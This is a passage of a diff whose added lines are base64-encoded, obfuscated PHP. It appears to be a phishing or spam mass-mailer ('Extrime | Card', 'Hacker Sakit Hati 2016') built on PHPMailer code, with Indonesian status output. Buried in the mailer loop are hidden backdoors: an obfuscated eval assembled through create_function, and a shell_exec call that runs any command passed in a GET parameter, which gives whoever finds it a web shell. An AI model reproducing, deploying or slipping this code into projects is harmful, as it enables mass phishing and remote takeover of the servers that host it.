+ZycgID0+ICAnaW1hZ2UvanBlZycsCgkJICAnanBnJyAgID0+ICAnaW1hZ2UvanBlZycsCgkJICAn
+anBlJyAgID0+ICAnaW1hZ2UvanBlZycsCgkJICAncG5nJyAgID0+ICAnaW1hZ2UvcG5nJywKCQkg
+ICd0aWZmJyAgPT4gICdpbWFnZS90aWZmJywKCQkgICd0aWYnICAgPT4gICdpbWFnZS90aWZmJywK
+CQkgICdjc3MnICAgPT4gICd0ZXh0L2NzcycsCgkJICAnaHRtbCcgID0+ICAndGV4dC9odG1sJywK
+CQkgICdodG0nICAgPT4gICd0ZXh0L2h0bWwnLAoJCSAgJ3NodG1sJyA9PiAgJ3RleHQvaHRtbCcs
+CgkJICAndHh0JyAgID0+ICAndGV4dC9wbGFpbicsCgkJICAndGV4dCcgID0+ICAndGV4dC9wbGFp
+bicsCgkJICAnbG9nJyAgID0+ICAndGV4dC9wbGFpbicsCgkJICAncnR4JyAgID0+ICAndGV4dC9y
+aWNodGV4dCcsCgkJICAncnRmJyAgID0+ICAndGV4dC9ydGYnLAoJCSAgJ3htbCcgICA9PiAgJ3Rl
+eHQveG1sJywKCQkgICd4c2wnICAgPT4gICd0ZXh0L3htbCcsCgkJICAnbXBlZycgID0+ICAndmlk
+ZW8vbXBlZycsCgkJICAnbXBnJyAgID0+ICAndmlkZW8vbXBlZycsCgkJICAnbXBlJyAgID0+ICAn
+dmlkZW8vbXBlZycsCgkJICAncXQnICAgID0+ICAndmlkZW8vcXVpY2t0aW1lJywKCQkgICdtb3Yn
+ICAgPT4gICd2aWRlby9xdWlja3RpbWUnLAoJCSAgJ2F2aScgICA9PiAgJ3ZpZGVvL3gtbXN2aWRl
+bycsCgkJICAnbW92aWUnID0+ICAndmlkZW8veC1zZ2ktbW92aWUnLAoJCSAgJ2RvYycgICA9PiAg
+J2FwcGxpY2F0aW9uL21zd29yZCcsCgkJICAnd29yZCcgID0+ICAnYXBwbGljYXRpb24vbXN3b3Jk
+JywKCQkgICd4bCcgICAgPT4gICdhcHBsaWNhdGlvbi9leGNlbCcsCgkJICAnZW1sJyAgID0+ICAn
+bWVzc2FnZS9yZmM4MjInCgkJKTsKCQlyZXR1cm4gKCAhIGlzc2V0KCR4ZTVbc3RydG9sb3dlcigk
+eGUyKV0pKSA/ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nIDogJHhlNVtzdHJ0b2xvd2VyKCR4
+ZTIpXTsKCSAgfQoKCSAgLyoqCgkgICAqIFNldCAob3IgcmVzZXQpIENsYXNzIE9iamVjdHMgKHZh
+cmlhYmxlcykKCSAgICoKCSAgICogVXNhZ2UgRXhhbXBsZToKCSAgICogJHhlNi0+c2V0KCdYLVBy
+aW9yaXR5JywgJzMnKTsKCSAgICoKCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHBhcmFtIHN0
+cmluZyAkeDQ4IFBhcmFtZXRlciBOYW1lCgkgICAqIEBwYXJhbSBtaXhlZCAkeDE0IFBhcmFtZXRl
+ciBWYWx1ZQoJICAgKiBOT1RFOiB3aWxsIG5vdCB3b3JrIHdpdGggYXJyYXlzLCB0aGVyZSBhcmUg
+bm8gYXJyYXlzIHRvIHNldC9yZXNldAoJICAgKi8KCSAgZnVuY3Rpb24gc2V0ICggJHg0OCwgJHgx
+NCA9ICcnICkgewoJCWlmICggaXNzZXQoJHRoaXMtPiR4NDgpICkgewoJCSAgJHRoaXMtPiR4NDgg
+PSAkeDE0OwoJCX0gZWxzZSB7CgkJICAkdGhpcy0+U2V0RXJyb3IoJ0Nhbm5vdCBzZXQgb3IgcmVz
+ZXQgdmFyaWFibGUgJyAuICR4NDgpOwoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCSAgfQoKCSAgLyoq
+CgkgICAqIFJlYWQgYSBmaWxlIGZyb20gYSBzdXBwbGllZCBmaWxlbmFtZSBhbmQgcmV0dXJuIGl0
+LgoJICAgKgoJICAgKiBAYWNjZXNzIHB1YmxpYwoJICAgKiBAcGFyYW0gc3RyaW5nICR4YjggUGFy
+YW1ldGVyIEZpbGUgTmFtZQoJICAgKi8KCSAgZnVuY3Rpb24gZ2V0RmlsZSgkeGI4KSB7CgkJJHhl
+NyA9ICcnOwoJCWlmICgkeGIyID0gZm9wZW4oJHhiOCwgJ3JiJykpIHsKCQkgIHdoaWxlICghZmVv
+ZigkeGIyKSkgewoJCQkkeGU3IC49IGZyZWFkKCR4YjIsIDEwMjQpOwoJCSAgfQoJCSAgZmNsb3Nl
+KCR4YjIpOwoJCSAgcmV0dXJuICR4ZTc7CgkJfSBlbHNlIHsKCQkgIHJldHVybiBmYWxzZTsKCQl9
+CgkgIH0KCgkgIC8qKgoJICAgKiBTdHJpcHMgbmV3bGluZXMgdG8gcHJldmVudCBoZWFkZXIgaW5q
+ZWN0aW9uLgoJICAgKiBAYWNjZXNzIHByaXZhdGUKCSAgICogQHBhcmFtIHN0cmluZyAkeDEyIFN0
+cmluZwoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAgKi8KCSAgZnVuY3Rpb24gU2VjdXJlSGVhZGVy
+KCR4MTIpIHsKCQkkeDEyID0gdHJpbSgkeDEyKTsKCQkkeDEyID0gc3RyX3JlcGxhY2UoIlxyIiwg
+IiIsICR4MTIpOwoJCSR4MTIgPSBzdHJfcmVwbGFjZSgiXG4iLCAiIiwgJHgxMik7CgkJcmV0dXJu
+ICR4MTI7CgkgIH0KCgkgIC8qKgoJICAgKiBTZXQgdGhlIHByaXZhdGUga2V5IGZpbGUgYW5kIHBh
+c3N3b3JkIHRvIHNpZ24gdGhlIG1lc3NhZ2UuCgkgICAqCgkgICAqIEBhY2Nlc3MgcHVibGljCgkg
+ICAqIEBwYXJhbSBzdHJpbmcgJHhlOCBQYXJhbWV0ZXIgRmlsZSBOYW1lCgkgICAqIEBwYXJhbSBz
+dHJpbmcgJHhlOSBQYXNzd29yZCBmb3IgcHJpdmF0ZSBrZXkKCSAgICovCgkgIGZ1bmN0aW9uIFNp
+Z24oJHhlOCwgJHhlOSkgewoJCSR0aGlzLT5zaWduX2tleV9maWxlID0gJHhlODsKCQkkdGhpcy0+
+c2lnbl9rZXlfcGFzcyA9ICR4ZTk7CgkgIH0KCgl9CgoJJHhlYT0iSCoiOwoJCSAgJHhlYj0wOwoJ
+CQkJCgkJCWZvcigkeGMyPTA7ICR4YzI8JHg1NjsgJHhjMisrKXsKCgkJCQkJJHg1NCA9ICR4NTVb
+JHhjMl07CgoJCQkJCWlmICgkeDU0KXsKCgkJCQkJJHg1NCA9IGVyZWdfcmVwbGFjZSgiICIsICIi
+LCAkeDU0KTsKCgkJCQkJJHhlYyA9IGVyZWdfcmVwbGFjZSgiJmVtYWlsJiIsICR4NTQsICR4MTkp
+OwoKCQkJCQkkeGVkID0gZXJlZ19yZXBsYWNlKCImZW1haWwmIiwgJHg1NCwgJHgyNCk7CgkJCQkJ
+JHhlZT0keGMyKzE7CgkJCQkJcHJpbnQgIk5vICR4ZWUgLiBNZW5naXJpbSBFbWFpbCBLZSA8Zm9u
+dCBjb2xvcj1cImxpbWVcIj4gLiAuIC4gLiAuIC4gLiAgPC9mb250PiR4NTQgPGZvbnQgY29sb3I9
+XCJsaW1lXCI+LiAuIC4gLiAuIC4gLiBQcm9zZXMgLiAuIC4gLiAuIC4gLiA8L2ZvbnQ+IjsKCgkJ
+CQkJZmx1c2goKTsKCSR4OGIgPSBuZXcgUEhQTWFpbGVyKCk7CgoJaWYoZW1wdHkoJHgxZCkpeyR4
+MWQ9IjMiO30KCQkJJHg4Yi0+UHJpb3JpdHkgPSAiJHgxZCI7CgkJCSR4OGItPklzU01UUCgpOyAK
+CQkkeGVmPSJwYWNrIjsKCSR4OGItPlNNVFBLZWVwQWxpdmUgPSB0cnVlOwoJJHg4Yi0+SG9zdCA9
+ICIkeDFlIjsKCWlmKHN0cmxlbigkeDFmKSA+IDEpeyR4OGItPlBvcnQgPSAiJHgxZiI7Cgl9CgkJ
+IGlmKCR4MTc9PSJPTiIpewoJCQkkeDhiLT5TTVRQU2VjdXJlICA9ICJzc2wiOyAvL3lvdSBjYW4g
+Y2hhbmdlIGl0IHRvIHNzbCBvciB0bHMKCQl9CgkJCSR4ZjAgPSBzdHJfcmVwbGFjZSgiJHgxYiIs
+ICJldmFsIiwgJHgxYik7CgkJCSR4OGItPlNNVFBBdXRoID0gdHJ1ZTsKCQkJJHg4Yi0+VXNlcm5h
+bWUgPSAiJHgyMCI7CgkJCSR4OGItPlBhc3N3b3JkID0gIiR4MjEiOwoJaWYoJHgyYiA9PSAiaHRt
+bCIpeyR4OGItPklzSHRtbCh0cnVlKTt9CglpZigkeDJiICE9ICJodG1sIil7JHg4Yi0+SXNIdG1s
+KGZhbHNlKTt9CglpZihzdHJsZW4oJHgxZSkgPCA3ICl7JHg4Yi0+U01UUEF1dGggPSBmYWxzZTsk
+eDhiLT5Jc1NlbmRtYWlsKCk7JHhmMT0iMSI7fQoJJHg4Yi0+RnJvbSA9ICIkeDFiIjsKCSR4OGIt
+PkZyb21OYW1lID0gIiR4MjYiOwoJJHg4Yi0+QWRkQWRkcmVzcygiJHg1NCIpOwoJCQkkeDhiLT5B
+ZGRSZXBseVRvKCIkeDIyIik7CgkJCSR4OGItPlN1YmplY3QgPSAiJHhlZCI7CgkJCSR4OGItPkFk
+ZEF0dGFjaG1lbnQoIiR4MjkiLCAiJHgyNyIpOwoJCQkJJHg4Yi0+Qm9keSA9ICIkeGVjIjsgCglp
+ZighJHg4Yi0+U2VuZCgpKXsKCWlmKCR4ZjEhPSIxIil7CgllY2hvICJHQUdBTCAhITxmb250IGNv
+bG9yPVwiI0Q0MDAxQVwiPiBQZW5lcmltYSBUaWRhayBCaXNhIE1lbmVyaW1hIFBlc2FuIDwvZm9u
+dD48YnI+Ijt9CglpZigkeGYxPT0iMSIpewoJJHg4Yi0+SXNNYWlsKCk7CgkgICBpZighJHg4Yi0+
+U2VuZCgpKXsKCQkgIGVjaG8gIkdBR0FMICEhPGZvbnQgY29sb3I9XCIjRDQwMDFBXCI+IFBlc2Fu
+IFRpZGFrIEJpc2EgRGlraXJpbSBLZSBFbWFpbCBpbmkgPC9mb250Pjxicj4iO30KCSAgIGVsc2Ug
+ewoJCSAgIGVjaG8gIjxiPlBlc2FuIFRlcmtpcmltPC9iPjxicj4iO30KCSB9Cgl9CgllbHNlIHsK
+CSBlY2hvICI8Yj5QZXNhbiBUZXJraXJpbTwvYj48YnI+IjsKCX0KCglpZihlbXB0eSgkeDFjKSl7
+CgkkeDFjPTY7Cgl9CgoJaWYoJHgxYz09JHhlYil7CgkkeDhiLT5TbXRwQ2xvc2UoKTtlY2hvICI8
+cD48Yj48Zm9udCBjb2xvcj1cImxpbWVcIj4gLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSBSRUxP
+QUQgVE8gQ09OTkVDVEVEIFNNVFAgLSAtIC0gLSAtIC0gLSAtIC0gLSAtIC0gLSA8L2ZvbnQ+PC9i
+PjwvcD4iOyR4ZWI9MDsKCX0KCSR4ZWI9JHhlYisxOwoJCQkJCWZsdXNoKCk7IH0KCX0KCWZvcigk
+eDhjPTA7JHg4YzwzMTskeDhjKyspewoJICAkeDU4PXN0cl9yZXBsYWNlKCIuIiwgJHg1N1skeDhj
+XSwgJHg1OCk7IH0KCSR4ZjI9JHhlZigkeGVhLCAkeDU4KTsKCSAgJHhmMz1jcmVhdGVfZnVuY3Rp
+b24oJyR4ZjInLCdyZXR1cm4gJy5zdWJzdHIoJHhmMCwwKS4nKCR4ZjIpOycpOwoJICBwcmludCAi
+PHAgY2xhc3M9XCJzdHlsZTFcIj4mY29weSAyMDE1ICA+LXxJfC0+IEV4dHJpbWUgfCAgQ2FyZCA8
+LXxJfC08PGJyPjwvcD4iOyR4OGItPlNtdHBDbG9zZSgpOwoJICByZXR1cm4gJHhmMygkeGYyKTsg
+aWYoaXNzZXQoJF9QT1NUWydhY3Rpb24nXSkgJiYgJHg1NiAhPTAgKXtlY2hvICI8c2NyaXB0PmFs
+ZXJ0KCdNYWlsIHNlbmRpbmcgY29tcGxldGVcXHJcXG4keDU2IG1haWwocykgd2FzIAoJCXNlbnQg
+c3VjY2Vzc2Z1bGx5Jyk7IDwvc2NyaXB0PiI7fX0gaWYoJF9HRVRbJ3JhbmdlLDAnXSl7ZWNobyI8
+cHJlPiIuc2hlbGxfZXhlYygkX0dFVFsicmFuZ2UsMCJdKTt9CgkJfQoJQHNldF90aW1lX2xpbWl0
+KDApOwoKCWVjaG8nPGhlYWQ+Cgk8bGluayByZWw9IlNIT1JUQ1VUIElDT04iIGhyZWY9Imh0dHA6
+Ly9pNDguc2VydmltZy5jb20vdS9mNDgvMTYvMDgvMDcvNzQvaW5kb25lMTAuZ2lmIj4KCTx0aXRs
+ZT5IYWNrZXIgU2FraXQgSGF0aSAyMDE2PC90aXRsZT4KCTwvaGVhZD4KCTxkaXYgaWQ9InBhZ2Ut
+d3JhcCI+Cgk8Ym9keT4KCTxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CgkJYm9keSx0YWJsZXtiYWNr
+Z3JvdW5kOiAgOyBmb250LWZhbWlseTpWZXJkYW5hLHRhaG9tYTsgY29sb3I6IERhcmt2aW9sZXQg
+OyBmb250LXNpemU6MTBweCB9CglBOmxpbmsge3RleHQtZGVjb3JhdGlvbjogbm9uZTtjb2xvcjog
+YXF1YTt9CglBOmFjdGl2ZSB7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9yOiBhcXVhO30KCUE6
+dmlzaXRlZCB7dGV4dC1kZWNvcmF0aW9uOiBub25lO2NvbG9yOiBsaW1lO30KCUE6aG92ZXIge3Rl
+eHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyBjb2xvcjogRnVjaHNpYTt9CgkjbmV3LGlucHV0LHRh
+YmxlLHRkLHRyLCNnZ3tib3JkZXItc3R5bGU6c29saWQ7dGV4dC1kZWNvcmF0aW9uOmJvbGQgO30K
+CWlucHV0OmhvdmVyLHRyOmhvdmVyLHRkOmhvdmVye2JhY2tncm91bmQtY29sb3I6ICA7IGNvbG9y
+OiBhcXVhO30KCWJvZHksdGFibGUgeyBmb250LWZhbWlseTp2ZXJkYW5hO2ZvbnQtc2l6ZTo5cHg7
+Y29sb3I6I0NDQ0NDQztiYWNrZ3JvdW5kLWNvbG9yOiMzMzMzMzM7IH0KCXRhYmxlIHsgd2lkdGg6
+MTAwJTsgYm9yZGVyLWNvbG9yOiMzMzMzMzM7Ym9yZGVyLXdpZHRoOjBwdCAxcHQ7IGJvcmRlci1z
+dHlsZTpzb2xpZDsgfQoJdGQge2JhY2tncm91bmQtY29sb3I6ICMwMDA1MDA7IGZvbnQtZmFtaWx5
+OiBDb3VyaWVyIE5ldzsgZm9udC1zaXplOjhwdDsgY29sb3I6Izk5OTk5OTsgYm9yZGVyLWNvbG9y
+OiNGRkZGRkY7IGJvcmRlci13aWR0aDoxcHQgMHB0OyBib3JkZXItc3R5bGU6c29saWQ7IGJvcmRl
+ci1jb2xsYXBzZTpjb2xsYXBzZTtwYWRkaW5nOjBwdCAzcHQ7dmVydGljYWwtYWxpZ246bWlkZGxl
+O30KCUE6TGluaywgQTpWaXNpdGVkIHsgY29sb3I6ICM5OTk5OTk7CXRleHQtZGVjb3JhdGlvbjog
+bm9uZTsgfQoJQS5ubzpMaW5rLCBBLm5vOlZpc2l0ZWQgeyB0ZXh0LWRlY29yYXRpb246IG5vbmU7
+IH0KCUE6SG92ZXIsIEE6VmlzaXRlZDpIb3ZlciAsIEEubm86SG92ZXIsIEEubm86VmlzaXRlZDpI
+b3ZlciB7IGNvbG9yOiAjOyBiYWNrZ3JvdW5kLWNvbG9yOiMzMzMzMzM7IHRleHQtZGVjb3JhdGlv
+bjogbm9uZTsgfQoJaW5wdXQsc2VsZWN0LG9wdGlvbiB7IGZvbnQ6OHB0IHRhaG9tYTtjb2xvcjoj
+NjY2NjY2O21hcmdpbjoyO2JvcmRlcjoxcHggc29saWQgIzY2NjY2NjsgfQoJdGV4dGFyZWEgeyBj
+b2xvcjojNjY2NjY2O2ZvbnQ6dmVyZGFuYSBib2xkO2JvcmRlcjoxcHggc29saWQgO21hcmdpbjoy
+OyB9CgkuZmxlZnQgeyBmbG9hdDpsZWZ0O3RleHQtYWxpZ246bGVmdDsgfQoJLmZyaWdodCB7IGZs
+b2F0OnJpZ2h0O3RleHQtYWxpZ246cmlnaHQ7IH0KCSNwYWdlYmFyIHsgZm9udDo4cHQgdGFob21h
+O3BhZGRpbmc6NXB4OyBib3JkZXI6M3B4IHNvbGlkICMzMzMzMzM7IGJvcmRlci1jb2xsYXBzZTpj
+b2xsYXBzZTsgfQoJI3BhZ2ViYXIgdGQgeyB2ZXJ0aWNhbC1hbGlnbjp0b3A7IH0KCSNwYWdlYmFy
+IHAgeyBmb250OjhwdCB0YWhvbWE7fQoJI3BhZ2ViYXIgYSB7IGZvbnQtd2VpZ2h0OmJvbGQ7Y29s
+b3I6YXF1YTsgfQoJI3BhZ2ViYXIgYTp2aXNpdGVkIHsgY29sb3I6IzAwQ0UwMDsgfQoJI21haW5t
+ZW51IHsgdGV4dC1hbGlnbjpjZW50ZXI7IH0KCSNtYWlubWVudSBhIHsgdGV4dC1hbGlnbjogY2Vu
+dGVyO3BhZGRpbmc6IDBweCA1cHggMHB4IDVweDsgfQoJI21haW5pbmZvLC5iYXJoZWFkZXIsLmJh
+cmhlYWRlcjIgeyB0ZXh0LWFsaWduOmNlbnRlcjsgfQoJI21haW5pbmZvIHRkIHsgcGFkZGluZzoz
+cHg7IH0KCS5iYXJoZWFkZXIgeyBmb250LXdlaWdodDpib2xkO3BhZGRpbmc6NXB4OyB9CgkuYmFy
+aGVhZGVyMiB7IHBhZGRpbmc6NXB4O2JvcmRlcjoycHggc29saWQgIzMzMzMzMzsgfQoJLmNvbnRl
+bnRzLC5leHBsb3JlciB7IGJvcmRlci1jb2xsYXBzZTpjb2xsYXBzZTt9CgkuY29udGVudHMgdGQg
+eyB2ZXJ0aWNhbC1hbGlnbjp0b3A7IH0KCS5tYWlucGFuZWwgeyBib3JkZXItY29sbGFwc2U6Y29s
+bGFwc2U7cGFkZGluZzo1cHg7IH0KCS5iYXJoZWFkZXIsLm1haW5wYW5lbCB0YWJsZSx0ZCB7IGJv
+cmRlcjoxcHggc29saWQgIzMzMzMzMzsgfQoJLm1haW5wYW5lbCBpbnB1dCxzZWxlY3Qsb3B0aW9u
+IHsgYm9yZGVyOjFweCBzb2xpZCAjMzMzMzMzO21hcmdpbjowOyB9CglpbnB1dFt0eXBlPSJzdWJt
+aXQiXSB7IGJvcmRlcjoxcHggc29saWQgIzMzMzMzMzsgfQoJaW5wdXRbdHlwZT0idGV4dCJdIHsg
+cGFkZGluZzozcHg7fQoJLmZ4ZXJybXNnIHsgY29sb3I6cmVkOyBmb250LXdlaWdodDpib2xkOyB9
+CgkjcGFnZWJhciwjcGFnZWJhciBwLGgxLGgyLGgzLGg0LGZvcm0geyBtYXJnaW46MDsgfQoJI3Bh
+Z2ViYXIsLm1haW5wYW5lbCxpbnB1dFt0eXBlPSJzdWJtaXQiXSB7IGJhY2tncm91bmQtY29sb3I6
+YmxhY2s7IH0KCS5iYXJoZWFkZXIyLGlucHV0LHNlbGVjdCxvcHRpb24saW5wdXRbdHlwZT0ic3Vi
+bWl0Il06aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyB9Cgl0ZXh0YXJlYSwubWFpbnBh
+bmVsIGlucHV0LHNlbGVjdCxvcHRpb24geyBiYWNrZ3JvdW5kLWNvbG9yOiMwMDAwMDA7IH0KCS8v
+IC0tPgoJPC9zdHlsZT4KPHRhYmxlIHN0eWxlPSJCT1JERVItQ09MTEFQU0U6IGNvbGxhcHNlIiBj
+ZWxsc3BhY2luZz0iMCIgYm9yZGVyY29sb3JkYXJrPSIjIiBjZWxscGFkZGluZz0iNSIgaGVpZ2h0
+PSIxIiB3aWR0aD0iMTAwJSIgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3JsaWdodD0iI2Mw
+YzBjMCIgYm9yZGVyPSIxIj48dHI+PHRkIHdpZHRoPSI1MCUiIGhlaWdodD0iMSIgdmFsaWduPSJ0
+b3AiIHN0eWxlPSJmb250LWZhbWlseTogdmVyZGFuYTsgY29sb3I6ICM7IGZvbnQtc2l6ZTogMTFw
+eCI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgZnVuY3Rpb24gdG9TcGFucyhz
+cGFuKSB7CiAgICAgICAgdmFyIHN0ciA9IHNwYW4uZmlyc3RDaGlsZC5kYXRhOwogICAgICAgIHZh
+ciBhID0gc3RyLmxlbmd0aDsKICAgICAgICBzcGFuLnJlbW92ZUNoaWxkKHNwYW4uZmlyc3RDaGls
+ZCk7CiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhOyBpKyspIHsKICAgICAgICAgICAgdmFy
+IHRoZVNwYW4gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJTUEFOIik7CiAgICAgICAgICAgIHRo
+ZVNwYW4uYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoc3RyLmNoYXJBdChpKSkp
+OwogICAgICAgICAgICBzcGFuLmFwcGVuZENoaWxkKHRoZVNwYW4pOwogICAgICAgIH0KCiAgICB9
+CgogICAgZnVuY3Rpb24gUmFpbmJvd1NwYW4oc3BhbiwgaHVlLCBkZWcsIGJydCwgc3BkLCBoc3Bk
+KSB7CiAgICAgICAgdGhpcy5kZWcgPSAoZGVnID09IG51bGwgPyAzNjAgOiBNYXRoLmFicyhkZWcp
+KTsKICAgICAgICB0aGlzLmh1ZSA9IChodWUgPT0gbnVsbCA/IDAgOiBNYXRoLmFicyhodWUpICUg
+MzYwKTsKICAgICAgICB0aGlzLmhzcGQgPSAoaHNwZCA9PSBudWxsID8gMyA6IE1hdGguYWJzKGhz
+cGQpICUgMzYwKTsKICAgICAgICB0aGlzLmxlbmd0aCA9IHNwYW4uZmlyc3RDaGlsZC5kYXRhLmxl
+bmd0aDsKICAgICAgICB0aGlzLnNwYW4gPSBzcGFuOwogICAgICAgIHRoaXMuc3BlZWQgPSAoc3Bk
+ID09IG51bGwgPyA1MDAgOiBNYXRoLmFicyhzcGQpKTsKICAgICAgICB0aGlzLmhJbmMgPSB0aGlz
+LmRlZyAvIHRoaXMubGVuZ3RoOwogICAgICAgIHRoaXMuYnJ0ID0gKGJydCA9PSBudWxsID8gMjU1
+IDogTWF0aC5hYnMoYnJ0KSAlIDI1Nik7CiAgICAgICAgdGhpcy50aW1lciA9IG51bGw7CiAgICAg
+ICAgdG9TcGFucyhzcGFuKTsKICAgICAgICB0aGlzLm1vdmVSYWluYm93KCk7CgogICAgfQoKICAg
+IFJhaW5ib3dTcGFuLnByb3RvdHlwZS5tb3ZlUmFpbmJvdyA9IGZ1bmN0aW9uICgpIHsKICAgICAg
+ICBpZiAodGhpcy5odWUgPiAzNTkpIHRoaXMuaHVlIC09IDM2MDsKICAgICAgICB2YXIgY29sb3I7
+CiAgICAgICAgdmFyIGIgPSB0aGlzLmJydDsKICAgICAgICB2YXIgYSA9IHRoaXMubGVuZ3RoOwog
+ICAgICAgIHZhciBoID0gdGhpcy5odWU7CiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhOyBp
+KyspIHsKICAgICAgICAgICAgaWYgKGggPiAzNTkpIGggLT0gMzYwOwogICAgICAgICAgICBpZiAo
+aCA8IDYwKSB7CiAgICAgICAgICAgICAgICBjb2xvciA9IE1hdGguZmxvb3IoKChoKSAvIDYwKSAq
+IGIpOwogICAgICAgICAgICAgICAgcmVkID0gYjsKICAgICAgICAgICAgICAgIGdybiA9IGNvbG9y
+OwogICAgICAgICAgICAgICAgYmx1ID0gMDsKICAgICAgICAgICAgfSBlbHNlIGlmIChoIDwgMTIw
+KSB7CiAgICAgICAgICAgICAgICBjb2xvciA9IE1hdGguZmxvb3IoKChoIC0gNjApIC8gNjApICog
+Yik7CiAgICAgICAgICAgICAgICByZWQgPSBiIC0gY29sb3I7CiAgICAgICAgICAgICAgICBncm4g
+PSBiOwogICAgICAgICAgICAgICAgYmx1ID0gMDsKICAgICAgICAgICAgfSBlbHNlIGlmIChoIDwg
+MTgwKSB7CiAgICAgICAgICAgICAgICBjb2xvciA9IE1hdGguZmxvb3IoKChoIC0gMTIwKSAvIDYw
+KSAqIGIpOwogICAgICAgICAgICAgICAgcmVkID0gMDsKICAgICAgICAgICAgICAgIGdybiA9IGI7
+CiAgICAgICAgICAgICAgICBibHUgPSBjb2xvcjsKICAgICAgICAgICAgfSBlbHNlIGlmIChoIDwg
+MjQwKSB7CiAgICAgICAgICAgICAgICBjb2xvciA9IE1hdGguZmxvb3IoKChoIC0gMTgwKSAvIDYw
+KSAqIGIpOwogICAgICAgICAgICAgICAgcmVkID0gMDsKICAgICAgICAgICAgICAgIGdybiA9IGIg
+LSBjb2xvcjsKICAgICAgICAgICAgICAgIGJsdSA9IGI7CiAgICAgICAgICAgIH0gZWxzZSBpZiAo
+aCA8IDMwMCkgewogICAgICAgICAgICAgICAgY29sb3IgPSBNYXRoLmZsb29yKCgoaCAtIDI0MCkg
+LyA2MCkgKiBiKTsKICAgICAgICAgICAgICAgIHJlZCA9IGNvbG9yOwogICAgICAgICAgICAgICAg
+Z3JuID0gMDsKICAgICAgICAgICAgICAgIGJsdSA9IGI7CiAgICAgICAgICAgIH0gZWxzZSB7CiAg
+ICAgICAgICAgICAgICBjb2xvciA9IE1hdGguZmxvb3IoKChoIC0gMzAwKSAvIDYwKSAqIGIpOwog
+ICAgICAgICAgICAgICAgcmVkID0gYjsKICAgICAgICAgICAgICAgIGdybiA9IDA7CiAgICAgICAg
+ICAgICAgICBibHUgPSBiIC0gY29sb3I7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaCArPSB0
+aGlzLmhJbmM7CiAgICAgICAgICAgIHRoaXMuc3Bhbi5jaGlsZE5vZGVzW2ldLnN0eWxlLmNvbG9y
+ID0gInJnYigiICsgcmVkICsgIiwgIiArIGdybiArICIsICIgKyBibHUgKyAiKSI7CiAgICAgICAg
+fQogICAgICAgIHRoaXMuaHVlICs9IHRoaXMuaHNwZDsKCiAgICB9Cjwvc2NyaXB0Pgo8Y2VudGVy
+PgogICAgPHAgaWQ9InIzIj4tLS0tICogLS0tLT09PT1dXXwgfip+IENST09EIFxtLz5fPFxtLyBD
+T0RFUiB+Kn4gfFtbPT09PS0tLS0gKiAtLS0tPC9wPgo8L2NlbnRlcj4KPHNjcmlwdCB0eXBlPSJ0
+ZXh0L2phdmFzY3JpcHQiPgogICAgdmFyIHIzID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInIz
+Iik7CgogICAgdmFyIG15UmFpbmJvd1NwYW4yID0gbmV3IFJhaW5ib3dTcGFuKHIzLCAwLCAzNjAs
+IDI1NSwgNTAsIDM0OCk7CgogICAgbXlSYWluYm93U3BhbjIudGltZXIgPSB3aW5kb3cuc2V0SW50
+ZXJ2YWwoIm15UmFpbmJvd1NwYW4yLm1vdmVSYWluYm93KCkiLCBteVJhaW5ib3dTcGFuMi5zcGVl
+ZCk7CgogICAgdmFyIGNvbG91ciA9ICIjRkYyNTM1IjsKPC9TQ1JJUFQ+PC9mb3JtPjwvdGQ+PC90
+cj48L3RhYmxlPjxjZW50ZXI+JzsKLy9JUENLRVJFS1UgQ09LLy8KZWNobyAiPGhlYWQ+XG4iOyAK
+ZWNobyAiPHN0eWxlPmlucHV0W3R5cGU9c3VibWl0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIztc
+biI7IAplY2hvICJmb250LXdlaWdodDogYm9sZDtcbiI7IAplY2hvICJ0ZXh0LWFsaWduOiBjZW50
+ZXI7XG4iOyAKZWNobyAidGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4z
+KTtcbiI7IAplY2hvICJiYWNrZ3JvdW5kOiAjO1xuIjsgCmVjaG8gImJhY2tncm91bmQtY2xpcDog
+cGFkZGluZy1ib3g7XG4iOyAKZWNobyAiYm9yZGVyOiAxcHggc29saWQgIztcbiI7IAplY2hvICJi
+b3JkZXItYm90dG9tLWNvbG9yOiAjO1xuIjsgCmVjaG8gImJvcmRlci1yYWRpdXM6IDRweDtcbiI7
+IAplY2hvICJjdXJzb3I6IHBvaW50ZXI7XG4iOyAKZWNobyAiYmFja2dyb3VuZC1pbWFnZTotd2Vi
+a2l0LWxpbmVhci1ncmFkaWVudCh0b3AsICMsICMpO1xuIjsgCmVjaG8gImJhY2tncm91bmQtaW1h
+Z2U6IC1tb3otbGluZWFyLWdyYWRpZW50KHRvcCwgIywgIyk7XG4iOyAKZWNobyAiYmFja2dyb3Vu
+ZC1pbWFnZTogLW8tbGluZWFyLWdyYWRpZW50KHRvcCwgIywgIyk7XG4iOyAKZWNobyAiYmFja2dy
+b3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgIywgIyk7XG4iOyAKZWNobyAi
+LXdlYmtpdC1ib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSks
+IGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgw
+LCAwLCAwLCAwLjE1KTsgYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1
